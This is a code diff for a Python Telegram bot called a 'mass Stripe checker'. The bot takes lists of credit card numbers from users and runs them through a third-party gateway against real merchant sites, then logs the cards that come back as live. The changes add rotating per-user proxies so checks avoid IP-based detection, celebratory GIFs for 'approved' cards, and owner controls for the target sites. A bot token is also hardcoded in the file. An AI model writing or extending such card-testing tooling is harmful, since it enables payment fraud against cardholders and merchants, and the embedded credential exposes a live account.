@@ -16,27 +16,31 @@ from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 import multiprocessing
 from collections import defaultdict
 
-# --- Bot Setup ---
+# ==================== BOT SETUP ====================
 BOT_TOKEN = os.getenv('BOT_TOKEN', '8827608169:AAE2NVInl52DgRkA7_bKw2ZZRUUy_pJhBec')
 bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=100)
+OWNER_IDS = [8754004223, 8664074279]
 
-# Owner IDs (list)
-OWNER_IDS = [8754004223,8664074279]
+# ==================== PROXY SYSTEM ====================
+user_proxies = {}  # user_id -> list of proxies
+proxy_lock = threading.Lock()
+current_proxy_index = {}  # user_id -> current proxy index for rotation
 
-# Thread-safe storage
+# ==================== GIF/VIDEO SYSTEM ====================
+approved_gif_path = None
+welcome_gif_path = None
+gif_lock = threading.Lock()
+
+# ==================== STORAGE ====================
 users_data = {}
 codes_data = {}
 status_data = {'total_checks': 0, 'total_approved': 0, 'users_checked': []}
-
-# Authorized groups (where bot can work)
 authorized_groups = []
 groups_lock = threading.Lock()
-
-# Stripe sites list (owner can add/remove)
 stripe_sites = ["rosetone.co.uk"]
 sites_lock = threading.Lock()
 
-# Thread locks
+# ==================== LOCKS ====================
 data_lock = threading.Lock()
 active_checks_lock = threading.Lock()
 file_locks = {
@@ -45,11 +49,11 @@ file_locks = {
     'results': threading.Lock()
 }
 
-# Active checking sessions - PER USER isolation
+# ==================== ACTIVE CHECKS ====================
 active_checks = {}
 stop_flags = {}
 
-# User limits configuration - Thread-safe
+# ==================== USER LIMITS ====================
 user_limits = {
     'free': {
         'single': 1,
@@ -74,23 +78,83 @@ user_limits = {
     }
 }
 
-# Daily usage tracking
+# ==================== USAGE TRACKING ====================
 daily_usage = defaultdict(int)
 usage_lock = threading.Lock()
-
-# Check cooldown
 last_check = defaultdict(float)
 cooldown_lock = threading.Lock()
 
-# Queue for processing checks
+# ==================== QUEUE & WORKERS ====================
 check_queue = queue.Queue()
 processing_threads = []
-
-# Thread pool for parallel checking - 100 workers
 parallel_executor = ThreadPoolExecutor(max_workers=100)
 
-# ==================== HELPER FUNCTIONS ====================
+# ==================== PROXY FUNCTIONS ====================
+def add_proxy_for_user(user_id, proxy):
+    user_id = str(user_id)
+    with proxy_lock:
+        if user_id not in user_proxies:
+            user_proxies[user_id] = []
+        if proxy not in user_proxies[user_id]:
+            user_proxies[user_id].append(proxy)
+            return True, f"✅ Proxy added: {proxy}"
+        return False, f"⚠️ Proxy already exists: {proxy}"
 
+def remove_proxy_for_user(user_id, proxy):
+    user_id = str(user_id)
+    with proxy_lock:
+        if user_id in user_proxies and proxy in user_proxies[user_id]:
+            user_proxies[user_id].remove(proxy)
+            return True, f"✅ Proxy removed: {proxy}"
+        return False, f"❌ Proxy not found: {proxy}"
+
+def get_next_proxy_for_user(user_id):
+    user_id = str(user_id)
+    with proxy_lock:
+        if user_id not in user_proxies or not user_proxies[user_id]:
+            return None
+        if user_id not in current_proxy_index:
+            current_proxy_index[user_id] = 0
+        proxy = user_proxies[user_id][current_proxy_index[user_id]]
+        current_proxy_index[user_id] = (current_proxy_index[user_id] + 1) % len(user_proxies[user_id])
+        return proxy
+
+def list_proxies_for_user(user_id):
+    user_id = str(user_id)
+    with proxy_lock:
+        return user_proxies.get(user_id, [])
+
+# ==================== GIF FUNCTIONS ====================
+def set_approved_gif(file_path):
+    global approved_gif_path
+    with gif_lock:
+        approved_gif_path = file_path
+        return True
+
+def set_welcome_gif(file_path):
+    global welcome_gif_path
+    with gif_lock:
+        welcome_gif_path = file_path
+        return True
+
+def send_gif_with_card(chat_id, card_info, gif_path=None, reply_to_message_id=None):
+    if not gif_path or not os.path.exists(gif_path):
+        return safe_send_message(chat_id, card_info, reply_to_message_id=reply_to_message_id)
+    try:
+        with open(gif_path, 'rb') as f:
+            bot.send_animation(
+                chat_id=chat_id,
+                animation=f,
+                caption=card_info,
+                parse_mode="HTML",
+                reply_to_message_id=reply_to_message_id
+            )
+        return True
+    except Exception as e:
+        print(f"Error sending GIF: {e}")
+        return safe_send_message(chat_id, card_info, reply_to_message_id=reply_to_message_id)
+
+# ==================== HELPER FUNCTIONS ====================
 def get_user_session_key(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -271,7 +335,7 @@ def get_bin_info(bin_number):
         'level': 'Unknown'
     }
 
-# ==================== 🔥 API CHANGED HERE ====================
+# ==================== API CHECK WITH PROXY SUPPORT ====================
 def stripe_api_check(cc, user_id=None):
     global stripe_sites
     
@@ -299,6 +363,11 @@ def stripe_api_check(cc, user_id=None):
             'error': 'User stopped check'
         }
     
+    # ✅ Get proxy for this user
+    proxy_to_use = None
+    if user_id:
+        proxy_to_use = get_next_proxy_for_user(user_id)
+    
     max_retries = 2
     last_error = None
     
@@ -315,9 +384,14 @@ def stripe_api_check(cc, user_id=None):
                     'error': 'User stopped check'
                 }
             
-            # ✅ NEW API URL (SIRF YAHAN CHANGE KIYA)
             api_url = f"https://wiardsclub.onrender.com/gateway=autostripe/key=wizard/site={site}/cc={cc}"
-            response = requests.get(api_url, timeout=300)
+            
+            # ✅ Use proxy if available
+            if proxy_to_use:
+                proxies = {'http': proxy_to_use, 'https': proxy_to_use}
+                response = requests.get(api_url, timeout=300, proxies=proxies)
+            else:
+                response = requests.get(api_url, timeout=300)
             
             if response.status_code != 200:
                 if attempt < max_retries - 1:
@@ -444,6 +518,7 @@ def stripe_api_check(cc, user_id=None):
         'retry_attempt': max_retries
     }
 
+# ==================== CARD CHECK FUNCTIONS ====================
 def check_card_parallel(card, check_info):
     try:
         user_id = check_info['user_id']
@@ -643,11 +718,34 @@ ______________________
 <b>[ϟ] Checked By:</b> ⏤ <code>{message.from_user.first_name}</code>
 <b>[ϟ] Daily Usage:</b> {get_user_today_usage(user_id)}/{daily_limit if daily_limit != float('inf') else '∞'}
 <b>[ϟ] Bot By:</b> @OG_UNDEFINED"""
+                    
+                    # ✅ Send with GIF if available
+                    with gif_lock:
+                        if approved_gif_path and os.path.exists(approved_gif_path):
+                            try:
+                                with open(approved_gif_path, 'rb') as f:
+                                    bot.send_animation(
+                                        message.chat.id,
+                                        animation=f,
+                                        caption=msg,
+                                        parse_mode="HTML",
+                                        reply_to_message_id=message.message_id
+                                    )
+                                with file_locks['approved']:
+                                    with open("approved.txt", "a", encoding="utf-8") as f:
+                                        f.write(f"{fullcc}|{result['status_text']}|{response_msg}\n")
+                                approved_cards_list.append(fullcc)
+                                continue
+                            except Exception as e:
+                                print(f"Error sending approved GIF: {e}")
+                    
+                    # Fallback: normal message
                     safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
                     approved_cards_list.append(fullcc)
                     with file_locks['approved']:
                         with open("approved.txt", "a", encoding="utf-8") as f:
                             f.write(f"{fullcc}|{result['status_text']}|{response_msg}\n")
+                            
                 elif card_status == 'three_d':
                     three_d += 1
                     fullcc = result['card']
@@ -788,6 +886,7 @@ def start_command(message):
     current_usage = get_user_today_usage(message.from_user.id)
     with sites_lock:
         sites_count = len(stripe_sites)
+    
     if user_status == 'free' and message.chat.type != 'private':
         msg = f"""<b>╔══════════════════╗</b>
 <b>   🧙‍♂️ UL MASS STRIPE CHECKER</b>
@@ -815,6 +914,7 @@ def start_command(message):
 • <code>.mtxt</code> (reply to .txt file)
 • <code>/info</code> - Your account info
 • <code>/limits</code> - View all limits
+• <code>/addproxy</code> - Add proxy for IP rotation
 
 <b>🤖 Bot By: @OG_UNDEFINED</b>"""
     else:
@@ -845,10 +945,288 @@ def start_command(message):
 • <code>.mtxt</code> (reply to .txt file)
 • <code>/info</code> - Your account info
 • <code>/limits</code> - View all limits
+• <code>/addproxy</code> - Add proxy for IP rotation
 
 <b>🤖 Bot By: @OG_UNDEFINED</b>"""
     
+    # ✅ Send welcome GIF if set
+    with gif_lock:
+        if welcome_gif_path and os.path.exists(welcome_gif_path):
+            try:
+                with open(welcome_gif_path, 'rb') as f:
+                    bot.send_animation(
+                        message.chat.id,
+                        animation=f,
+                        caption=msg,
+                        parse_mode="HTML"
+                    )
+                return
+            except Exception as e:
+                print(f"Error sending welcome GIF: {e}")
+    
     safe_send_message(message.chat.id, msg)
+
+# ==================== PROXY COMMANDS ====================
+
+@bot.message_handler(commands=['addproxy'])
+def add_proxy_command(message):
+    if not check_free_user_access(message):
+        return
+    if not check_group_authorization(message):
+        return
+    
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        safe_send_message(
+            message.chat.id,
+            """❌ Usage: /addproxy <proxy>
+
+<b>Proxy Formats:</b>
+• <code>http://user:pass@ip:port</code>
+• <code>socks5://user:pass@ip:port</code>
+• <code>http://ip:port</code>
+
+<b>Example:</b>
+• /addproxy http://admin:123@1.2.3.4:8080
+• /addproxy socks5://user:pass@5.6.7.8:1080
+
+<b>Commands:</b>
+• /listproxy - List all your proxies
+• /removeproxy <proxy> - Remove a proxy""",
+            reply_to_message_id=message.message_id
+        )
+        return
+    
+    proxy = parts[1].strip()
+    success, msg = add_proxy_for_user(message.from_user.id, proxy)
+    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
+
+@bot.message_handler(commands=['listproxy'])
+def list_proxy_command(message):
+    if not check_free_user_access(message):
+        return
+    if not check_group_authorization(message):
+        return
+    
+    proxies = list_proxies_for_user(message.from_user.id)
+    if not proxies:
+        safe_send_message(
+            message.chat.id,
+            "❌ No proxies added. Use /addproxy to add one.",
+            reply_to_message_id=message.message_id
+        )
+        return
+    
+    proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
+    safe_send_message(
+        message.chat.id,
+        f"""📋 <b>Your Proxies ({len(proxies)})</b>
+
+{proxy_list}
+
+<b>Commands:</b>
+• /addproxy <proxy> - Add new proxy
+• /removeproxy <proxy> - Remove proxy""",
+        reply_to_message_id=message.message_id
+    )
+
+@bot.message_handler(commands=['removeproxy'])
+def remove_proxy_command(message):
+    if not check_free_user_access(message):
+        return
+    if not check_group_authorization(message):
+        return
+    
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        safe_send_message(
+            message.chat.id,
+            "❌ Usage: /removeproxy <proxy>\nExample: /removeproxy http://1.2.3.4:8080",
+            reply_to_message_id=message.message_id
+        )
+        return
+    
+    proxy = parts[1].strip()
+    success, msg = remove_proxy_for_user(message.from_user.id, proxy)
+    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
+
+# ==================== GIF SET COMMAND ====================
+
+@bot.message_handler(commands=['setgif'])
+def set_gif_command(message):
+    if message.from_user.id not in OWNER_IDS:
+        safe_send_message(message.chat.id, "❌ Only owner can use this command!")
+        return
+    
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        msg = """❌ Usage: /setgif <type>
+
+<b>Types:</b>
+• approved - GIF for approved cards
+• welcome - GIF for welcome message
+
+<b>Example:</b>
+• /setgif approved
+• /setgif welcome
+
+<b>Then reply with GIF file.</b>"""
+        safe_send_message(message.chat.id, msg)
+        return
+    
+    gif_type = parts[1].lower()
+    if gif_type not in ['approved', 'welcome']:
+        safe_send_message(message.chat.id, "❌ Invalid type! Use 'approved' or 'welcome'")
+        return
+    
+    with data_lock:
+        users_data[str(message.from_user.id)] = {'gif_type': gif_type}
+    
+    safe_send_message(
+        message.chat.id,
+        f"📤 Send the GIF file for '{gif_type}' (reply to this message)",
+        reply_to_message_id=message.message_id
+    )
+    bot.register_next_step_handler(message, process_gif_upload)
+
+def process_gif_upload(message):
+    if message.from_user.id not in OWNER_IDS:
+        safe_send_message(message.chat.id, "❌ Only owner can do this!")
+        return
+    
+    if not message.document and not message.animation:
+        safe_send_message(message.chat.id, "❌ Please send a GIF file (mp4 or gif)")
+        return
+    
+    gif_type = users_data.get(str(message.from_user.id), {}).get('gif_type', 'approved')
+    
+    try:
+        if message.document:
+            file_info = bot.get_file(message.document.file_id)
+            file_name = f"{gif_type}_{int(time.time())}.gif"
+        else:
+            file_info = bot.get_file(message.animation.file_id)
+            file_name = f"{gif_type}_{int(time.time())}.mp4"
+        
+        downloaded = bot.download_file(file_info.file_path)
+        
+        with open(file_name, 'wb') as f:
+            f.write(downloaded)
+        
+        if gif_type == 'approved':
+            set_approved_gif(file_name)
+            safe_send_message(message.chat.id, f"✅ Approved GIF set successfully!\nFile: {file_name}")
+        else:
+            set_welcome_gif(file_name)
+            safe_send_message(message.chat.id, f"✅ Welcome GIF set successfully!\nFile: {file_name}")
+        
+        if str(message.from_user.id) in users_data:
+            del users_data[str(message.from_user.id)]
+            
+    except Exception as e:
+        safe_send_message(message.chat.id, f"❌ Error: {str(e)}")
+
+# ==================== SITE MANAGEMENT COMMANDS ====================
+
+@bot.message_handler(commands=['site'])
+def manage_sites_command(message):
+    if message.from_user.id not in OWNER_IDS:
+        safe_send_message(message.chat.id, "❌ Only owner can use this command!")
+        return
+    
+    with sites_lock:
+        current_sites = stripe_sites.copy()
+    
+    if not current_sites:
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("➕ Add Site", callback_data="add_site_admin"))
+        safe_send_message(
+            message.chat.id,
+            "🌐 No sites configured. Click 'Add Site' to add one.",
+            reply_markup=markup,
+            reply_to_message_id=message.message_id
+        )
+        return
+    
+    # Send each site as separate message with delete button
+    for site in current_sites:
+        row = types.InlineKeyboardMarkup(row_width=2)
+        row.add(
+            types.InlineKeyboardButton(f"🌐 {site}", callback_data=f"view_site_{site}"),
+            types.InlineKeyboardButton("❌", callback_data=f"delete_site_{site}")
+        )
+        safe_send_message(
+            message.chat.id,
+            f"📡 Site: <code>{site}</code>",
+            reply_markup=row,
+            reply_to_message_id=message.message_id
+        )
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("➕ Add New Site", callback_data="add_site_admin"))
+    safe_send_message(
+        message.chat.id,
+        f"📊 Total Sites: {len(current_sites)}\nClick 'Add New Site' to add more.",
+        reply_markup=markup,
+        reply_to_message_id=message.message_id
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_site_'))
+def delete_site_callback(call):
+    if call.from_user.id not in OWNER_IDS:
+        bot.answer_callback_query(call.id, "❌ Only owner can do this!", show_alert=True)
+        return
+    
+    site = call.data.replace('delete_site_', '')
+    with sites_lock:
+        if site in stripe_sites:
+            stripe_sites.remove(site)
+            bot.answer_callback_query(call.id, f"✅ Site '{site}' deleted!")
+            safe_edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=f"❌ Site <code>{site}</code> has been deleted.",
+                parse_mode="HTML"
+            )
+        else:
+            bot.answer_callback_query(call.id, "❌ Site not found!", show_alert=True)
+
+@bot.callback_query_handler(func=lambda call: call.data == 'add_site_admin')
+def add_site_admin_callback(call):
+    if call.from_user.id not in OWNER_IDS:
+        bot.answer_callback_query(call.id, "❌ Only owner can do this!", show_alert=True)
+        return
+    
+    bot.answer_callback_query(call.id, "📝 Please send site URL")
+    msg = safe_send_message(
+        call.message.chat.id,
+        "📝 Send site URL to add:\nExample: <code>example.com</code>\n\nType /cancel to cancel."
+    )
+    bot.register_next_step_handler(msg, process_add_site_admin)
+
+def process_add_site_admin(message):
+    if message.from_user.id not in OWNER_IDS:
+        safe_send_message(message.chat.id, "❌ Only owner can do this!")
+        return
+    
+    if message.text.lower() == '/cancel':
+        safe_send_message(message.chat.id, "❌ Cancelled!")
+        return
+    
+    site = message.text.strip().lower().replace('http://', '').replace('https://', '')
+    
+    with sites_lock:
+        if site in stripe_sites:
+            safe_send_message(message.chat.id, f"⚠️ Site <code>{site}</code> already exists!")
+            return
+        stripe_sites.append(site)
+    
+    safe_send_message(
+        message.chat.id,
+        f"✅ Site <code>{site}</code> added successfully!\nTotal Sites: {len(stripe_sites)}"
+    )
+
+# ==================== CHK COMMAND ====================
 
 @bot.message_handler(func=lambda message: message.text and 
                     (message.text.lower().startswith('.chk') or 
@@ -962,14 +1340,35 @@ ______________________
 <b>[ϟ] Checked By:</b> ⏤ <code>{message.from_user.first_name}</code>
 <b>[ϟ] Daily Usage:</b> {get_user_today_usage(message.from_user.id)}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}
 <b>[ϟ] Bot By:</b> @OG_UNDEFINED"""
-            with file_locks['approved']:
-                with open("approved.txt", "a", encoding="utf-8") as f:
-                    f.write(f"{fullcc}|{status_text}|{response_msg}\n")
+            
+            # ✅ Send with GIF if available
+            with gif_lock:
+                if approved_gif_path and os.path.exists(approved_gif_path):
+                    try:
+                        with open(approved_gif_path, 'rb') as f:
+                            bot.send_animation(
+                                message.chat.id,
+                                animation=f,
+                                caption=result_msg,
+                                parse_mode="HTML",
+                                reply_to_message_id=message.message_id
+                            )
+                        with file_locks['approved']:
+                            with open("approved.txt", "a", encoding="utf-8") as f:
+                                f.write(f"{fullcc}|{status_text}|{response_msg}\n")
+                        return
+                    except Exception as e:
+                        print(f"Error sending approved GIF: {e}")
+            
             safe_edit_message_text(
                 chat_id=message.chat.id,
                 message_id=ko,
                 text=result_msg
             )
+            with file_locks['approved']:
+                with open("approved.txt", "a", encoding="utf-8") as f:
+                    f.write(f"{fullcc}|{status_text}|{response_msg}\n")
+                    
         elif '3D Required ⚠️' in status_text or is_3d:
             safe_edit_message_text(
                 chat_id=message.chat.id,
@@ -1009,6 +1408,8 @@ ______________________
             message_id=ko,
             text=f"❌ Error: {str(e)}"
         )
+
+# ==================== MASS COMMAND ====================
 
 @bot.message_handler(func=lambda message: message.text and 
                     (message.text.lower().startswith('.mass') or 
@@ -1071,6 +1472,8 @@ def mass_command(message):
             unique_cards.append(card)
     safe_send_message(message.chat.id, f"🔍 Found {len(unique_cards)} cards to check...", reply_to_message_id=message.message_id)
     check_queue.put((message, unique_cards, False, 'mass'))
+
+# ==================== MTXT COMMAND ====================
 
 @bot.message_handler(func=lambda message: message.text and 
                     (message.text.lower().startswith('.mtxt') or 
@@ -1142,6 +1545,8 @@ def mtxt_command(message):
         check_queue.put((message, unique_cards, True, 'mtxt'))
     except Exception as e:
         safe_send_message(message.chat.id, f"❌ Error processing file: {str(e)}", reply_to_message_id=message.message_id)
+
+# ==================== STOP CHECK COMMAND ====================
 
 @bot.message_handler(commands=['stopcheck'])
 def stop_check_command(message):
@@ -1981,6 +2386,7 @@ def info_command(message):
 • /limits - View all limits
 • /ping - Check bot status
 • /stopcheck - Stop current check
+• /addproxy - Add proxy for IP rotation
 
 <b>🤖 Bot By: @OG_UNDEFINED</b>"""
     safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
@@ -2068,6 +2474,9 @@ def help_command(message):
 • /limits - View all limits
 • /ping - Check bot status
 • /stopcheck - Stop current check
+• /addproxy - Add proxy for IP rotation
+• /listproxy - List your proxies
+• /removeproxy - Remove a proxy
 • /help - This help message"""
     if user_status in ['premium', 'owner']:
         msg += """
@@ -2096,7 +2505,9 @@ def help_command(message):
 • /gid - Get group ID
 • /getapproved - Get approved cards file
 • /clearapproved - Clear approved cards
-• /stats - Approved cards statistics"""
+• /stats - Approved cards statistics
+• /site - Manage sites with buttons
+• /setgif - Set GIF for approved/welcome"""
     else:
         msg += """
 
@@ -2107,7 +2518,7 @@ def help_command(message):
 <b>📝 Card Formats:</b>
 • 4111111111111111|12|2026|123
 • 4111111111111111 12 2026 123
-• 4111111111111111:12|2026:123
+• 4111111111111111:12:2026:123
 
 <b>💳 CC Filters (.chk command):</b>
 • .chk visa - Test Visa card
@@ -2119,6 +2530,12 @@ def help_command(message):
 • One card per line
 • Supports multiple formats
 • Max 10MB file size
+
+<b>🌐 Proxy System:</b>
+• /addproxy http://user:pass@ip:port
+• /listproxy - List your proxies
+• /removeproxy <proxy> - Remove proxy
+• Proxies rotate automatically per card check
 
 <b>⚠️ Important:</b>
 • Bot supports 600+ users simultaneously
@@ -2176,6 +2593,9 @@ print(f"⚡ PARALLEL CHECKING: 3-CARD BATCHES ONLY (3-3 batch)")
 print(f"🔒 USER ISOLATION FIXED: Each user's session is now properly isolated")
 print(f"🛑 STOP BUTTON FIXED: Now correctly identifies user")
 print(f"🔧 MULTI-USER FIXED: Multiple users can check simultaneously without conflicts")
+print(f"🌐 PROXY SYSTEM ADDED: Users can add proxies for IP rotation")
+print(f"🎬 GIF SYSTEM ADDED: Admin can set GIF for approved cards and welcome")
+print(f"📡 SITE MANAGEMENT ADDED: /site command with buttons")
 print(f"🔥 ALL YOUR ORIGINAL FEATURES PRESERVED 100%")
 
 bot.infinity_polling(timeout=30, long_polling_timeout=30)
